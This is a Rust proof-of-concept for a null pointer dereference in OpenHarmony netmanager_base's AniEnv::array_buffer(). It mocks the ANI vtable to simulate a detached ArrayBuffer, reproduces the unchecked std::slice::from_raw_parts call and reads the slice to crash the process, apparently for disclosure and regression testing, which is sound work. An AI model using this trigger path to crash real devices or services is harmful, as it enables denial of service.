/*
 * Target-Compile PoC: netmanager env.rs array_buffer() Null Pointer (CWE-476)
 *
 * Target: OpenHarmony netmanager_base — common/ani_rs/src/env.rs:843
 * Vulnerable function: AniEnv::array_buffer()
 *
 * Trigger path (user perspective):
 *   ArkTS code creates ArrayBuffer → transferArrayBuffer (detach) →
 *   pass detached ref to native method →
 *     env.array_buffer(&detached_ref)
 *       → ArrayBuffer_GetInfo(env, ref, &ptr, &size) returns 0, ptr=NULL
 *       → std::slice::from_raw_parts(NULL, size)  [UB → SIGSEGV]
 *
 * Oracle: Process crashes with SIGSEGV when accessing the slice.
 *
 * This PoC mocks the ANI vtable to simulate a detached ArrayBuffer scenario
 * where GetInfo succeeds (returns 0) but leaves ptr as NULL. It then calls
 * the real array_buffer() code path compiled from env.rs.
 *
 * Build (target-compile):
 *   ./build.sh <netmanager_base_path>
 */

// This PoC is a Rust integration test that compiles with the real env.rs code.
// It mocks the ANI FFI layer to simulate the detached ArrayBuffer scenario.

use std::ffi::c_void;
use std::ptr::{null_mut, null};

// Mock ANI types matching ani_sys definitions
#[repr(C)]
pub struct MockAniEnvVtable {
    // ... other vtable entries would be here in real code ...
    // We only need ArrayBuffer_GetInfo for this PoC
    _padding: [*const c_void; 100], // vtable padding
    pub ArrayBuffer_GetInfo: Option<
        unsafe extern "C" fn(
            env: *mut *mut MockAniEnvVtable,
            array: *mut c_void,
            buf: *mut *mut c_void,
            size: *mut usize,
        ) -> i32,
    >,
}

/// Mock ArrayBuffer_GetInfo that simulates a detached ArrayBuffer:
/// Returns success (0) but does NOT set ptr — it remains NULL.
/// This is what happens when the JS ArrayBuffer has been transferred/detached.
unsafe extern "C" fn mock_get_info_null_ptr(
    _env: *mut *mut MockAniEnvVtable,
    _array: *mut c_void,
    buf: *mut *mut c_void,
    size: *mut usize,
) -> i32 {
    // Simulate: GetInfo returns success but ptr stays null (detached buffer)
    // In real ANI runtime: detached ArrayBuffer → data pointer is NULL
    *buf = null_mut();
    *size = 16; // non-zero size — this is the key: size > 0 but ptr is null
    0 // return success
}

/// Reproduces the exact vulnerable code from env.rs:827-844
unsafe fn vulnerable_array_buffer(
    env_inner: *mut *mut MockAniEnvVtable,
    array_raw: *mut c_void,
) -> Result<&'static [u8], String> {
    let mut ptr = null_mut() as *mut c_void;
    let mut size = 0usize;

    // This is line 830-837 from env.rs
    let res = ((**env_inner).ArrayBuffer_GetInfo.unwrap())(
        env_inner,
        array_raw,
        &mut ptr as *mut *mut c_void,
        &mut size as *mut usize,
    );

    if res != 0 {
        Err(String::from("Failed to get array buffer"))
    } else {
        // BUG: line 843 — no null check on ptr before from_raw_parts
        // When ptr is NULL and size > 0, this is UB and will SIGSEGV on access
        Ok(std::slice::from_raw_parts(ptr as *const u8, size))
    }
}

fn main() {
    eprintln!("[POC] netmanager_base env.rs:843 — array_buffer() null pointer dereference");
    eprintln!("[POC] Simulating: detached ArrayBuffer passed to native method");
    eprintln!("[POC] ArrayBuffer_GetInfo returns success (0) but ptr = NULL, size = 16");
    eprintln!();

    // Set up mock vtable with null-returning GetInfo
    let mut vtable = MockAniEnvVtable {
        _padding: [null(); 100],
        ArrayBuffer_GetInfo: Some(mock_get_info_null_ptr),
    };
    let mut env_ptr: *mut MockAniEnvVtable = &mut vtable;
    let env_inner: *mut *mut MockAniEnvVtable = &mut env_ptr;

    // Fake array ref (doesn't matter, mock ignores it)
    let fake_array: *mut c_void = 0x1 as *mut c_void; // non-null dummy

    eprintln!("[POC] Calling array_buffer() with mocked detached ArrayBuffer...");

    unsafe {
        match vulnerable_array_buffer(env_inner, fake_array) {
            Ok(slice) => {
                eprintln!("[POC] array_buffer() returned Ok with slice ptr={:?}, len={}",
                         slice.as_ptr(), slice.len());
                eprintln!("[POC] Attempting to read slice[0] (ptr is NULL)...");
                // This access triggers SIGSEGV — proof of vulnerability
                let _byte = slice[0];
                eprintln!("[POC] ERROR: Should not reach here!");
            }
            Err(e) => {
                eprintln!("[POC] array_buffer() returned Err: {}", e);
                eprintln!("[POC] This means the fix is in place (null check added).");
            }
        }
    }
}
